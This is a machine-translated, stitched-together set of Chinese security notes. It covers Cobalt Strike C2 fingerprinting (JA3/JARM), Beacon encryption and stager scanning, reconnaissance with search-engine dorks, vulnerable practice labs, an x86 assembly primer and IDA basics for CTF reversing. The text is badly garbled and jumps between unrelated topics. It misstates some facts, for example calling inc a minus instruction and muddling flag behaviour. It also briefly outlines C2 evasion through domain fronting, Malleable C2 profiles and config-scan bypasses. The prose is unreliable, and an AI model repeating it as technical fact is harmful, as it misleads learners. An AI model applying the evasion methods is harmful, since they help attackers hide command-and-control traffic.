However, the C 2 server on Kali Linux responds to the client application as unique to how the common server on Internet responds to the socket.

Although servers respond differently to different clients, they always respond consistently to the same client.

Therefore, if ja3 + ja3s are combined, this malicious communication can be identified without considering details such as the destination IP, domain name, or certificate.

Issues Using JARM fingerprinting The Salesforce researchers published an article called Easily Identify Malicious Servers on the Internet with JARM and published a J A R M scan tool on github.

JARM is an active TLS service fingerprint tool to quickly verify that a set of TLS servers use the same TLS configuration; divide TLS servers and identify the company that may belong to; identify the default application or infrastructure of the site; identify malware C & C control nodes, and other malicious servers.

The core of JARM is that TLS Server returns different Server Hello packets depending on the parameters in TLS Client Hello.

While the parameters of the Client Hello can be modified artificially specified, so that the corresponding special Server Hello, s can be obtained by sending multiple carefully constructed Client Hello s to eventually form the fingerprint of the TLS Server.

Specific parameters that can have an impact include, but are not limited to: the call order of third-party libraries such as the operating system and its version OpenSSL and their third-party libraries, whereas mentioned above, TLS servers respond differently to different clients, but they always respond consistently to the same client.

Therefore, the server cannot be fingerprint identified only based on JA3 S, as in J A 3.

JARM takes a fuzz-like approach, actively sends 10 TLS Hello packets to the T L S server and analyzes specific fields in Server Hello, hashing 10 TLS server responses in a specific manner, and eventually generates JARM fingerprints.

The 10 T L S client H e l l o packages in the JARM are specially designed to extract the unique response in the TLS server.

In short, JARM is different from the JA3, JA3/S we commonly used for traffic analysis threats: JA3, JA3/S is mainly based on traffic, and the server produces different JA3S fingerprints facing different clients.

JARM is completely active to scan and generate fingerprints, the server can produce unique JARM fingerprints.

Ideally, if the JARM uniquely corresponds to the C2, then an additional feature of the active discovery of the C2 nodes occurs.

However, when the validation, A search for the J A R M corresponding to the Cobalt Strike revealed 2,338 independent IP, However, TOP5 is applied as: Cobalt Strike team server 1, 137CobaltStrike-Beacon Service side 373Tomcat-Web Server 40Weblogic Application server 21WordPressCMS blog system 14 can see the same as the CobaltStrike above, JARM also has W e b applications for opening up T L S, such as Tomcat, Weblogic and WordPress, That is, the CobaltStrike application is just a subset of the JARM corresponding TLS server.

However, in the later verification, it was found that the JARM fingerprints had no strong correlation with the upper application, and the Tomcat and Cobalt Strike using the same JDK had the same J A R M fingerprints, which explains why so many Weblogic and Tomcat applications were identified, so that the Cobalt Strike. could not be judged directly by JARM

Similarly, J A R M is not unique for CobaltStrike, and its JARM is related to T L S services in different JDK environments.

Therefore, JARM is only a way of identifying TLS service-side features, which can only be used as an auxiliary means and cannot be completely used as the unique fingerprint for upper-level Web applications.

Beacon security envisioned such a problem that if someone hijacks your communication traffic and can listen to the data your Beacon sends back to Team Server.

Because Beacon has a variety of security features: 1.Beacon stage verifies that Team Server2.Beacon task request and task output are encrypted 3.Beacon has a replay Protection mechanism 4.Beacon stagers itself has no security mechanism communication encryption mechanism. When you start Team Server and creates Beacon Listener, Team Server creates a public key pair to secure subsequent transmission processes.

This article takes the segmented transmission payload as an example to explain the security features of Cobalt Strike in detail.

When stager downloads the stage, the public key is also sent together.

When the Beacon stage prepares the check in, the first step is to send the metadata about the beacon session.

The metadata contains basic information, such as user, PID, computer name, IP address, and a chance talk key created in the metadata by Beacon stage.

To ensure security, Beacon stage uses a public key to encrypt the metadata, which means that only Team Server is able to decrypt the package.

When Beacon downloads tasks from Team Server, the team server encrypts these tasks using the session key, and Beacon stage also uses the session key to decrypt the task list.

Also when returning the task results, Beacon stage encrypts the task output using the session key.

You can see that the Raphael has fully taken its security issues into account when designing the Cobalt Strike.

stager URL generation Mechanism When using payload staging Cobalt Strike hosts stager. on its Web server

Anyone can connect to this server and download payload, by accessing the correct URI or direct access will return.

It can be seen that when the incoming stager. is calculated by checksum8, the corresponding stager. can be downloaded under the corresponding conditions

stager encryption mechanism like constipation Most stager s are PE files, beacon code exists in its block and uses 4 bytes different or encryption, from which config files can be parsed from beacon after being different or decrypted.

Detailed reverse procedures refer to CobaltStrike4.0 remote control analysis.

Beacon staging server Scan describes the security of Beacon in the previous section that if the payload staging phased delivery is turned on, anyone can connect to the Cobalt Strike server to download the payload and analyze its content.

Therefore, you can scan the suspicious servers on the whole network to download and analyze the Cobalt Strike beacon stager configuration.

Obtaining the stager address According to the default address generation rules, the stager address can be launched inverse from the URI by the following algorithm, and the address of the 32-bit or 64-bit payload s can be generated according to different inputs.

Modifying the default configuration The default server configuration is easily traced, and the MS08067 team has published Cobaltstrike removal features that can avoid being directly discovered by modifying the default port, default certificate.

Domain front can forward traffic to a real C 2 server via a CDN node, where the CDN node ip performs traffic transfer by identifying the requested Host header, using the high confidence of the configured domain name to bypass the traffic audit.

Malleable C2 ProfileCobalt Strike provides customizable Malleable C2 Profile, to customize Beacon traffic interaction content, disguise transport traffic as highly reputable sites like Google, baidu, or hide encryption instructions into cookie, url parameters to bypass traffic audits.

As mentioned above, Cobalt Strike's decryption algorithm has not changed, the difference lies only in the difference of different keys or keys.

The zero-team security research team published Bypass cobaltstrike beacon config scan, on the public account to prevent profiles from being resolved.

A WEB container is a passive program: the container responds only when an other computer.

The main function of Web containers is to store, process, and pass web pages to customers.

Delivery pages are most commonly HTML documents that may contain images, style sheets, and scripts in addition to the text content.

Fast self-built web security test environment What is dynamic language dynamic language is programming for server behavior.

This is called a server-side script or a server script.

Can prevent: malicious crack password, brush ticket, forum irrigation, effectively prevent a hacker to a specific registered user with a specific program violent login attempts. In fact, using verification code is the way of many websites, we use a relatively simple way to achieve this function.

This question can be computer-generated and judged, but only humans have to answer it.

Since the computer cannot answer CAPTCHA questions, the users who answer the questions can be considered human.

Captcha code set but there is no effect test, random transmission verification code can also successfully log in.

The captcha can be reused, such as the current captcha code 1111, and then although you log in after the verification code will change, but you enter 1111 but he determines that your verification code is correct.

The first kind is to find the password, send the password or secret text or verification code to the mailbox through such a method to judge whether it is myself or not.

Send a link to the reset the password to the mailbox.

Every successful penetration, there is a very complete information collection.

The breadth of information collection determines the breadth of the attack, and the breadth of knowledge determines the depth of the attack.

He will provide some of the IPV4,IPV6, domain names, so what can we start with IP and IP first?

We already know that an ip belongs to the education network segment, so how do we know the other ip specifically?

Passive information gathering Passive information collection is using some online mass crawling websites.

Because these syntax online quite much, don't take specific websites to show.

Google hack syntax Baidu syntax Fofa syntax shodan syntax Zhong Kui eye micro step online Google let's look at Google,Google syntax you may be familiar with the most basic edu website suffix.

Baidu syntax and google grammar have no big gap between Fofa grammar and how to locate a school in fofa?

There are two ways one is org, one is icon_hash is afraid to find assets?

Because a school's icon_hash is often a few fixed, so when we search for icon_hash, we will also have different results.

The dvwa is suitable for understanding vulnerabilities and simple vulnerabilities, while owaspbwa is closer to the actual complex business environment.

Damn Small Vulnerable Web is a walk-through system for W e b application vulnerabilities developed in the Python language.

Its system consists only of one python script file, covering 26 Web application vulnerability environments, and the number of script code lines is controlled within 100 lines, the current version of v0.1m.

WebGoat runs on a platform with java virtual machines and currently offers more than 30 training courses, including cross-site scripting attacks (XSS), access control, thread security, operation hidden fields, Manipulation parameters, weak session cookie, SQL blind injection, digital SQL injection, string SQL injection, web service, Open Authentication failure, dangerous HTML annotations, and more.

WebGoat offers a range of tutorials for web secure learning, and certain courses also give video presentations that guide users to exploit these vulnerabilities for attack.

Each mirror will have crack targets, mostly the Boot2root, from starting the virtual machine to getting the root permission for the operating system and viewing the flag.

However, because of the length of the book is only a brief introduction of the mentioned knowledge points is not explained in detail.

And the content of the two books and knowledge or more, so plan to read the two books to absorb the essence of the two books and add the knowledge in the two books, and find each case to do again, and then make detailed record as reading notes, also convenient as I just started friends to learn more knowledge.

Because their usual work is penetration and recent work often on business trips, and participate in drills and CTF is more, so take out a large piece of time to write reverse technical articles is not practical, and each knowledge to find the right case to do experiments to understand is more troublesome, so this series of articles may update is slow, but time is like a sponge water squeeze there will always have, will insist on writing.

In this statement this series of articles for beginners and beginners, the boss do not spray, but still strongly suggest that the masters read guidance and put forward valuable suggestions to exchange and supplement, the little brother must listen to with an open mind, very grateful.

You enter an instruction and it runs once, then stop and wait for the next instruction.

These instructions are all binary, called the operation code is the machine instruction, such as the addition instruction is 00000011.

The role of the compiler is to translate programs written in a high-level language into machine instructions that the CPU can read and then pass them to the CPU for execution.

For humans, binaries are unreadable and simply cannot see what the machine does.

To address readability issues, and the occasional editing requirements, the assembly language was born.

Application field of assembly language is the advantage of direct access to computer hardware, so the execution is more efficient than those high-level language, and occupy very little resources, generally used for: system kernel, industrial control, drivers, real-time system, core algorithms and other areas with extremely high requirements for operation efficiency, or to break through the system performance bottleneck and frequently used subroutines or program segments written in assembly.

Because the assembly language is a machine-oriented language, Its assembly instructions basically correspond to one-to-one machine instructions, So the assembly instruction is as single and specific as the machine instruction, For example, if you want computer computing, Then we have to refine the arrangement of the CPU to perform each step of the operation, And when writing assembly language programs, So the use of assembly language development programs requires extremely high programming levels for programmers, And the cycle of development programs is particularly long, To achieve a simple function has to be very troublesome, So few people write purely compiled applications, But we learn CTF reverse does not need to learn assembly where we can develop large applications, Our aim is to read the assembly, Understand its features.

Because the assembly language itself is a symbolic representation of machine instructions, and different types of CPU have different machine instruction systems, there are also different types of assembly language. The main introduction of this article is that the most common is the x 86 assembly language used by Intel CPU.

The assembly language arises, so we can think that both the machine language and the assembly language are equivalent.

Later, it was found that when compiling a function in the assembly language, a continuous piece of code was the same or similar, so we considered using a language instead of this assembly language, thus creating a high-level language.

Thus, all advanced languages can be converted into assembly languages, which in turn translate into machine languages.

Conversely, all machine languages can also be converted to assembly languages.

But not all assembly languages can turn to advanced languages.

Understanding the register we first have to figure out that the register and memory are not the same thing, the register is in the CPU, there is a memory bar inside.

The access speed of the register is about 100 times the memory.

The CPU itself is only responsible for operations and not for storing data.

Data is generally stored in memory, and the CPU goes to read and write the data when it needs to use it.

However, the CPU is much higher than memory, and to avoid being dragged down by memory, the CPU has its own primary and secondary cache.

The CPU cache can be seen as a faster read-write memory.

However, the CPU cache is still not fast enough, in addition, the data in the cache address is not fixed, every time the CPU read and write to address before read and write, which will slow down.

Thus, in addition to the cache, the CPU has its own registers to store the most commonly used data.

In other words, the most frequently read and write data will be put in the register, the CPU preferentially read and write the register, and then the register switches the data with the memory.

The register does not rely on address to distinguish data but on names.

Each register has its own name and we tell the CPU to go specific which register to take the data so the speed is fastest so the register is known as the zero level cache of the CPU.

General register first talk about general register, as the name suggests, general register is a general register for transferring and storing data, can also participate in arithmetic logic operations, and save the operation results.

Early x86 CPU had only 8 registers, and each had different uses.

The "bit" of the 32-bit CPU, 64-bit CPU refers to the size of the register, and the register size of the 32-bit CPU is 4 bytes, which is the role of the 4x8=32-bit universal register: EAX: the accumulator, which is automatically used in the multiplication and division instructions.

In Win32, it is generally used in the return value of the function.
The CPU automatically uses ECX as a cycle counter, is commonly used in string and loop operations, in loop instructions (LOOP) or string operations, ECX is used to cycle count, and each cycle executed, ECX is automatically reduced by the CPU.

Data registers, often used to put the remainder produced by the integer division.

Base address register, store base address during memory addressing.

Pointing to the top of the top stack frame, where ESP is used to address the data on the stack, ESP registers generally do not participate in arithmetic operations, commonly referred to as a stack pointer register.

Pointing to the bottom of the top stack frame, the EBP is used by a high-level language to reference parameters and local variables.

Generally, it points to the source string during a string operation.

Generally, it points to the target string during a string operation.

Say the instruction register EIP: store the next instruction address to execute, almost can not be used as others.

The 16-bit universal register is: AX, BX, CX, DX, SI, DI, BP, SP each of the first four (AX, BX, CX, DX) can be divided into two separate registers, high and 8 bits low, so the 8-bit universal register is: 8 bits high: AH BH CH DH and 8 bits low: AL BL CL DL operation of some 8 bits does not affect the corresponding 8-bit data.

In the flag register within the CPU, a special register has the following three functions.

Use to store certain execution of the relevant instructions.

Use to provide a behavioral basis for the CPU to perform the relevant instructions.

Use to control how the CPU works related.

This particular register is known as a flag register, and the x86 flag register has 32 bits.

Flag registers They are roughly divided into two categories: status flags and control flags.

Status information used to record the program running results, many instructions will set it accordingly.

It can be set with instructions to control the way the processor performs instructions.

See the various sign bits in detail below: forward flag CF: When the highest valid bit of the operation result has a forward or debit, the forward flag puts 1, namely CF=1, otherwise CF=0.

If the operation result is 0, ZF=1; otherwise ZF=0.

If the arithmetic result has an overflow, OF=1, otherwise OF=0.
The overflow flag OF and the forward flag CF are two flags of different meanings. The forward flag indicates whether the result of the unsigned number operation is out of range, and the operation result is still correct; The overflow flag indicates whether the result of the signed number operation is out of range, and the operation result is not correct.

The number of symbols is the symbol with the highest bit, the rest of the value number, all bits are used to represent the number of signed number are for binary.

All unsigned binaries represent values with no symbolic bits.

For string operation instructions, control the direction of address change: set DF=0, and the memory address increases automatically.

DF=1, and the memory address is automatically reduced.

However, regardless of the value of the flag, the CPU must respond to interrupt requests made by unshielded breaks outside the CPU, as well as interrupt requests generated within the CPU.

When IF=1, the CPU may respond to an interrupt request outside the CPU.

When IF=0, the CPU does not respond to an interrupt request outside the CPU.

There are also specialized instructions in the CPU instruction system to change the value of the flag bit IF.

The CLI instruction is used to reset the interrupt flag, after execution IF=0.

The STI command is used to place the interrupt flag, after execution IF=1; the trap flag TF.

When the TF is set to 1, the CPU goes into a single step execution mode, where each instruction is executed, produces a single step interrupt request.

This way is mainly used for the debugging of programs.

There is no special instruction in the instruction system to change the value of the flag bit TF, but the programmer may use other ways to change its value.

Paragraph register The base address of the segment where the segment is a preallocated memory area.

Some segments store instructions with programs, some store program variables, and other segments, such as stack segments store function variables and function parameters, etc.

In the 32-bit CPU, the segment registers extend from 4 to 6 at CS, DS, SS, ES, FS, GS., respectively

The FS and GS segment registers also belong to additional segment registers, each used to determine the actual address of a logical segment, each having its own use.

The relevant knowledge of segment register is relatively difficult for novice learning, so we do not need to fully master at the beginning, only do a general understanding, with the improvement of code reverse analysis technology level, we need to learn segment register.
Before learning the addressing the method, let's learn what the instruction is. The instruction consists of operation code and operand.

Object of various operations, some instructions do not require operands, the usual instructions all have one or two operands, and some individual instructions have three or even four operands.

The operating code for each instruction is represented by a unique mnemonic, corresponding to a binary encoding of the machine instruction.

The operand in an instruction may count a specific value, may be a register for storing the data, or a memory address indicating where the data is stored.

Let's learn the address methods. We know that the CPU will constantly process data during the program.

CPU processing data usually comes from three places: 1. Give data directly in instructions 2. Save data in register 3. Save data in memory When we develop in high-level language, how the CPU needs data processing during code compilation.

When writing a program in the assembly language, where the data of the instruction operation comes from and where the CPU should remove the data is a problem that the assembler needs to solve himself.

The process of the CPU finding the final data is called addressing.

Therefore, the value in the ESI register is 00403000.

This addressing method is called register addressing.

Data can be stored in memory in a variety of ways, mainly with direct addressing, register indirect addressing, address addressing and base addressing.

The memory address where the operand is directly given in the instruction is called a direct address.

The address of the operand is given by the register, where the address refers to the memory address, while the actual operand is stored in memory.

There are other register relative address, change address address, base address change address address, scale factor address here is not introduced one by one, you can search to understand.

The stack is a "backward and first out LIFO" memory area, located in the stack segment, it is essentially a piece of memory, the memory allocation of the stack is extended from high to low address.

The stack has only one outlet, the current stack top, specified with the stack pointer register ESP, the stack top is the one end of the smaller address, the bottom of the stack remains unchanged.

The function is to press the data into the stack (stack top), and modify the value of the stack pointer ESP register (minus 4). For example, the value of the original stack pointer ESP is 0019C6EC of the following figure below. After we perform the push 0x666, the data 666 is deposited into the stack species, the stack pointer is reduced by 4, and the ESP becomes 0019C6E8.

In actual reverse engineering, most of the cases are facing line by line of assembly instructions, in reverse engineering need to use assembly language knowledge is not so much, just as WIndows programmers do not need to remember all Windows API functions, do reverse engineering we do not need to remember all assembly instructions, we only need to know the common assembly instructions, understand its general role, the rest of the not common or rare instructions can be learned by the manual or document, when we query the instruction format, will see the following style.

The mov inside this is the assembly instruction, r refers to the register, m to memory, imm to the immediate number, 8,16,32 to the width of the data, 8,16 and 32 bits respectively.

Here is a list of the common assembly instructions.

It should be noted that memory cannot be transmitted directly between memory, the purpose operand cannot be immediate, and the width of the two operands must be consistent.

The instruction has two parameters, the source and destination operand.

Unlike the usage of mov, although its operand is also a memory unit, it obtains the address of the memory unit, not the data in the memory unit.

The AND operator in the assembly language is operated in bit.

As shown in the following example, each bit in X performs A N D operation with the corresponding bit in Y: the corresponding bit has the result with the same bit of 1, otherwise the flag bit affected with the result of 0and command has OF\\SF\\ZF\\PF\\CF.

Because the logical operation in the assembly is calculated by the "bit", so remember to convert to a binary operation during the numerical operation.

The or instruction or instruction is a logical bit "or" operation instruction used to logic or manipulate each data bit in the destination operand with the corresponding bit in the source operand.

The corresponding bit is performing the "or" operation, the corresponding bit is equal to 0, the result is 0, otherwise the flag bit affected by the phase "or" is the 1or command has all bits in the OF\\SF\\ZF\\PF\\CF3.not instruction n o t command instruction to trigger the operand.

The result is called the anticode.

Turn a, b into 2 decimal numbers, and then compare, if 0 or 1 on each digit is the same, then the result takes 0 and 1 if different, and the resulting result is converted to the original decimal number, which is the result.

If the values of a and b are different, the difference result is 1.

If both values of a and b are the same, the different result is 0.
The add instruction is an addition instruction that adds the source and destination operand, and the added result is stored in the destination operand, and the operand must be the same length.

The adc instruction is an addition with an input, similar to the a d d instruction, the difference is that after adding the destination operand to the source operand, you need to add the value of the flag register CF bit, the result after performing the adc command is destination operand = destination operand + source operand + CF bit value.

The sbb and the adc instruction above, the sbb instruction is subtraction with debit, similar to the sub instruction, with the difference of subtracting the destination operand minus the flag register CF bit and the result after executing the sbb instruction = destination operand-source operand-CF bit value.

The inc instruction is a minus instruction for a minus operation on the purpose operand.

We open the OD to practice the operation of the stack, enter the following instructions executed in order, and then observe the changes in the stack and related registers.

The stack situation before not running the instructions is shown in the figure below.

The popad instruction pops up these universal registers from the stack in the opposite order.

After performing the pushad, the modified register has only the e s p register, because after the eight universal registers enter the stack, the e s p register points to the top of the new stack, and the value of the e s p register pressed in by the pushad instruction is the value before the e s p register was changed.

Although the m o v assignment operation of eax,ebx is performed in the middle, the register is completely restored after executing the popad instruction.

There are also two instructions for the pushfd and popfd,pushfd instructions pressing the 32-bit EFLAGS flag register on the stack and the popfd command popup the value at the top of the stack and sends to the EFLAGS flag register.

After executing the pushad instruction as shown in the following figure, the value of eflags 0x246 is pressed into the stack, as mentioned before when recognizing the register, the eflags flag register is also a 32-bit register, which do not forget, not into the value of 0,1,0,1,0,1,0,1, respectively.

The common way to save the eflags flag register is not modified is: pusdfd other statement popfd that may modify the eflags flag register transfer instructions we introduced earlier can operate on the general register, but can not change the execution process, that is, we can't change the value of the EIP register.

Because EIP is automatically modified during the execution of instructions, now we will talk about how to change the value of the EIP register, so that the program can jump execution rather than sequential execution, and transfer instructions to realize the program structure of branches, cycles, and processes, etc.

Unconditional transfer instruction tionThe jmp instruction is an unconditional transfer instruction.

Whenever the jmp instruction is encountered, jump to the corresponding address for execution.
Then we took a look at the EIP and jumped to the e d x location for execution.

Conditional transfer instructions There are multiple conditional transfer instructions, usually called conditional transfer instructions jcc instruction set: the jcc instruction determines it to jump has nothing to do with anything else.

It is only related to the EFLAG flag register and determines how to jump according on the different flag bits in the e f l a g flag register.

The following are two instructions often used with jcc instructions, test and comparison instructions.

The test logic and calculates the two operand and is not sent to the destination operand, but the influence flag bit OF, SF, ZF, PF and CFtest instructions are usually used to test whether some conditions are met.

The instruction cmp compares the two operands in a manner equivalent to the subtraction of reducing the source operand with the destination operand, but the cmp only affects the corresponding flag register and does not send the result of the subtraction into the destination operand.

The result of the above operation is definitely that JE will not jump because EAX and EBX are not equal so how can we make the JE instruction jump we can modify EAX and EBX to the same value so on the code.

We can also use another way that the Z F flag instruction jumps by either changing the c F flag bit by double-clicking the value behind the Z F flag bit after executing the cmp instruction, because whether the J E instruction jumps depends mainly on the ZF flag bit.

In general programming languages, conditional branches are achieved by reserved words such as if, switch, while in the assembly by the cmp, test instruction controlling the flag, and the jump class instruction completing the branch according to the flag.

The loop instruction loop instruction is a loop control command that needs to count using the e c x register, when executed to the l o o p instruction, the value in the e c x register is reduced first, if the value in the e c x register is greater than 0, transferred to the address after the loop instruction and if the value in the e c x register is l o o p equal to 0, execute the next instruction of the loop instruction.

You can practice the following code in the OD: in the code, the 00401020 behind the LOOP is the address of the add eax,ecx instruction, and you can modify the address displayed in your OD according to the situation.

Pay attention to the observation register e c x changes and the number of loops during performing the F8 single step.

The call procedure instruction and the return instruction c a l l instruction is the instruction calling the procedure which acts similar to the jmp instruction.

You can modify the value of the EIP register so that the instructions are transferred to an other address.

Unlike the jmp instruction, the call instruction saves the address of the next instruction of the c a l l instruction to the stack before modifying the value of the EIP register to return to the original call instruction after the call process is completed.

When the call instruction calls the function, the parameters of the function are stored in the stack via the push instruction.

The call instruction is calling the function and the return value of the function is generally stored in eax.
The ret instruction is used for the return of the procedure, which pops up 4 bytes from the top of the stack into the EIP register.

Generally, the instruction is returned at the position or at the end of the process.

The call instruction call process presses the next instruction of the c a l l instruction into the top of the stack. When the ret instruction is encountered during the process execution, the call instruction is ejected into the EIP register, so that the process of the code will follow the next instruction of the call instruction.

The ret instruction does not need to correct the position of the top of the stack back directly, while the retn instruction needs to correct the position of the top of the stack before returning.

We enter the following instruction debugging exercise in the OD: first need to observe the stack before executing call, then use a single step run into call, and then observe the EIP and the stack again.

The changes before and after the step are shown in the following figure below. We can see that after the F7 key single step into the call instruction, the top of the stack changes from 0012FF8C to 0012FF88, and the address 00401005 is saved in the stack.

And the value of the EIP register 00401024, namely the current instruction to execute is at the RETN.

After we press F8 here, we send the stack top value 00401005 into the EIP register, and the top of the stack changes back to the original 0012FF8C.

View the disassembly window and the code to execute stays at mov eax,00401024 at address 00401005.

String operation instruction A string operation instruction mainly operates the data in continuous areas in memory, and three commonly used instructions: movs, stos and rep, are discussed here.

MOVS is the destination address of the memory source address with the help of ESI and EDI registers.

The MOVS instruction has three MOVSB, MOVSW, MOVSD widths.

Whether the addresses that both registers point to increase or decrease needs to rely on the D F flag bit of the EFLAGS flag register for control.

When the DF flag bit is 0, the E S I register and E D I registers point automatically after the MOVS command; when the D F flag bit is 1, the ESI register and EDI register point automatically after the MOVS instruction.

We practice the following code in the OD debugger: in the above code, the CLD instruction is to reset the DF flag bit, that is, to set the DF flag bit to 0; the STD instruction is to position the DF flag bit, that is, to set the DF flag bit to 1.

After performing the MOVS we pay attention to observe changes in the values of the ESI registers and EDI registers, as well as the values in the address it points to.

Strial storage directionA string storage instruction STOS is to store the value of the AL/AX/EAX into the memory unit to which the EDI register points to.
The STOS instruction has three widths: STOSB, STOSW and STOSD.

By default, STOS is the equivalent of STOSD After executing the STOS instruction, the address that the EDI register points to is automatically increased by 1 unit or automatically reduced by 1 unit.

Whether the EDI register points to more or less address needs to rely on the D F flag bit of the EFLAGS flag register for control.

When the DF flag bit is 0, the address directed by the E D I register increases after executing the STOS command; when the D F flag bit is 1, the address the EDI register points to after executing the STOS command.

You can practice debugging the following code in OD: after executing the MOVS instruction, observe the changes in the value of the EDI register and the value in the address to.

Sometimes the STOS instructions are used when initializing a buffer.

Repeating the prefix instruction REP instruction means "repeat", because since it is a pass string, it is impossible to transfer from byte by byte, so you need to have a register to control the length of the string, this register is ECX, the value of ECX is judged before each execution, from then on to set the number of repeated executions.

In fact, in the reverse of CTF, you may encounter various forms of assembly language, or x64, mips and so on, the so-called one method, we have to learn the most basic and then to understand other forms.

Learning the assembly language you also need to practice more in dynamic debugging and static analysis, the next article will explain the use of dynamic debugging and static analysis tools.

As the saying goes, "If you want to be good, you must first benefit the device". It is very necessary for us to choose an appropriate static analysis tool. I recommend beginners to use IDA for static analysis, after all, I D A is the most N B tool in CTF reverse static analysis.

The following is the basic use of IDA. In case of any omission, please include more content and put forward valuable opinions.

The Flag. is solved by static analysis disassembly code or pseudo-code

IDA is the most commonly used decomassembly tool for static analysis, using recursive descent decomassembly algorithm, supports very rich file types, and DOS, Java,. in addition to the common PE, ELF formatNET and other file formats.

Here we will learn the common use of I D A in the CTF reverse.

The cfg mainly contains a variety of profiles such as the basic IDA profile ida.The cfgids folder mainly contains symbolic files that describe the shared library content that can be referenced by binary files loaded to the IDA.

The loaders folder contains the ida extension procs folder for identifying executables during file loading contains the processor module s i g folder supported by IDA contains the signature t i l folder of existing code that IDA utilizes in various pattern matching operations contains some type library information.

The IDA records the layout IDA specific to the various compiler libraries into 32-bit and 64-bit versions through this information, and we choose the corresponding IDA version when choosing the disassembler.

Finally, I will use a real CTF topic to go for a presentation.

When the IDA exits, the following figure prompts. By default, save the database file during analysis, and we can also click not to save the database.

Because IDA features are particularly many and are not necessarily suitable for CTF reverse, so for entry to beginners, I only choose the functions commonly used in CTF reverse to explain.

The main interface just loaded the program will show as the interface shown in the following figure, the left for the function used by the analyzed program, click to view the assembly code, the right for the graphical view, the condition judgment and cross-reference are marked, the green line represents the jump code after the conditions are established, the red code is no successful jump.

The top arrow then points to a display window for the various data.

Using space keys on a graphical view can be switched to a code view that marks the addresses of the current code, and gives the analyzed functions, parameters, local variables, constants, structures, cross-referencing information, etc.

The ribbon above is called the navigation band, a linear view of the address space of the file when loading the navigation tape, which by default presents the entire address range of the binary file.

Different colors indicate different types of files, such as code or data.

There is also a small currently unknown indicator pointing to the navigation band address corresponding to the address displayed in the current decomassembly window.

We usually analyze the program to omit its library functions while analyzing the regular functions of the program, and we can determine the approximate range based on the navigation band.

Sometimes a very efficient way to locate a program's key code location is found through a string window.

We double-click to jump to the string reference.

The input window in the view can list all functions of the current executable call, including the function name, the name of the library that contains the function, and its virtual address, and double-click to jump to the function address of the decomassembly window.

The output window displays the export information of the program. If there is no export information, the default is the OEP of the program, and the name is the start name window: the functions, data and names recognized by the IDA are listed and divided into the following categories.

We can press F2 key to modify the data, and press F2 key again to apply.
IDA can identify commonly used system structures based on the type library, and we can also add our own identified structures at the time of analysis.

Enumeration and structure windows similar can define enumeration types myself to help yourself better analyze disassembly code.

Displays the starting address, end address, permissions, etc. of each segment of the program.

Signature is s i g files, we can make sig files for common libraries using IDA's fair tool, and when loading the sig files of the library, the function name in the library can be identified as what we make.

We press G in the decomassembly window, and we enter an address in the box to jump to the specified address.

After performing the jump, we press ESC to return to the position before the jump.

To press the CTRL + ENTER button after the jump, you can repeatedly jump between multiple jumps.

Cross-referencing The cross-referencing said above can know the relationship that the specified code calls to each other.

We just need to be at the function, press F5.

The prototype of the first behavioral function, then the declaration of the local variable below, and each local variable is followed by the annotation to indicate the location where this variable is, and then the logic of the function, the variable name in the generated pseudo-code may vary over different versions of IDA across machines.

But F5 is not omnipotent, and it will fail. According to most reasons are some parameter setting errors related to this function, such as the call convention calling other functions in this function, resulting in failure of parameter parsing or stack imbalance before and after the call.

Sometimes we may encounter call analysis failed, when we have to find the wrong location on the error prompt interface and modify the call convention in the function prototype declaration.

Another one is that the error of sp-analusis failed, may be because the optimization problem of the compiler makes the call convention of a function call wrong, or the number of parameters of the function is wrong, causing the IDA to miscalculate the change amount of the stack pointer, or maybe the program code has some interference code, making the IDA disassembly analysis error.

In a normal program without a dynamic length array, the offset of the stack before and after the call remains unchanged after initialization.

Then we look at the stack pointer a little bit, and compare it with the change law of the normal stack pointer. Then we can find out the problem and modify it.

Renaming can see that the system helps us identify many functions and add names such as GetDlgItemTextA, strlen, ExitProcess et al.

If we encounter a function or data that don't know what, the IDA does not recognize it, we can double-click in to see its logic, analyze what it does, and then name it ourselves.

Add marks If we want to make a mark somewhere in the analysis process, and then convenient to find yourself, then we curate the point to the position we want to mark, then press ALT + M, and then give it a name to click to save, and then if we mark a lot of positions, press CTRL + M to view the list of their marked positions, double-click to jump over.

formatting instruction operand can be formatting the constant used in the IDA, and we should use the constant as much as possible, so as to analyze more clearly. Generally, IDA is automatically formatting according to the context of the decomassembling instruction, but sometimes the IDA displays the constant as a hexadecimal number.

We can move the cursor over the constant you want to formatting, right-click to convert its feed, or let it show as a string.

This ends if the end of the function cannot be determined or an illegal instruction is found.

Press F5 to correctly identify the pseudo-code.

Code and data conversion we think about why security problems?The essential reason is that the computer doesn't distinguish between what is data and what is code.

The same goes with IDA, which may not correctly distinguish between data and code, data bytes may be wrongly identified as code bytes, and code bytes may be wrongly identified as data bytes.

Some programs use this IDA flaw to combat static counterassembly, though we can use our human brain to help IDA through.

The IDA lets us specify a headecimal piece of data as code or data.

Assuming that we are convinced that a certain segment of hexadecimal data is an instruction, we just need to move the cursor to its start position and press the C key, press P to define its code as a subroutine and list the parameter call.

To undefine, press U, and the data is redisplayed in hexadecimal form.

Then it was converted using shortcut C into code at the address 4040DF so that we corrected the disassembly code showing normal content.

The dw 0E89h is the added junk data against the static backassembly, the purpose is to interfere with the IDA disassembly, to mistake the data for code, resulting in the wrong logic.

Although the normal reassembly code can be seen after the code, but can not be recompiled directly, at this time we convert the extra two bytes into empty instructions, so that the function can be directly recompiled.

String When we determine that a certain field of data is a string, we move the cursor to press A to convert it to a string, and the IDA is in C form by default.

IDA can sometimes not determine the ASCII string, the reason for this error is that this string is not called directly in the program, for example in the figure below, we just need to move the cursor to 40478EH, press A, which is defined and generate a variable name, if you want to recover press U, you can see these string variables in the name window.

After the adjustment, the structure structure is a data structure that can combine different types of data structure into a composite data type, and the structure can be declared as a variable, pointer, or array, thus realizing a more complex data structure.

Let's start with the following example: The above MyStruct is a structure that we define.

Individual variables in the construct are then assigned in the main function and finally printed out.

The IDA is shown below, the reference mode is analyzed above CALL, three variables are transmitted in a buffer manner, presumably the structure transfer we insert a construct by the Ins key in the construct window and then we click on the construct name.

Then press D, add the variables in the structure, rename the variables by N, we can convert the variables into the structure type in the local stack, and by ALT + Q, we can see the variables displayed in the reassembly window to be displayed as a structure.

IDA script support.idc and.py document type.

Then we choose our.The idc script file, execution script, the output of the script will be displayed in the IDA prompt window.

The IDA script also supports the command function, saying that before the SMC, namely the code self-modification technology, that is, to save the encrypted data in the executable, only when the program runs will decrypt the encryption code somewhere through a restore code, and then execute the decrypted code.

We find its decryption function, analyze its decryption process, and you can write a decryption script in place of SMC.

We choose the script file to load the script and press shift + F12 to open the IDC command execution window, and we can compile the code on the right at 401060 before executing the function and upload the parameter decryption.

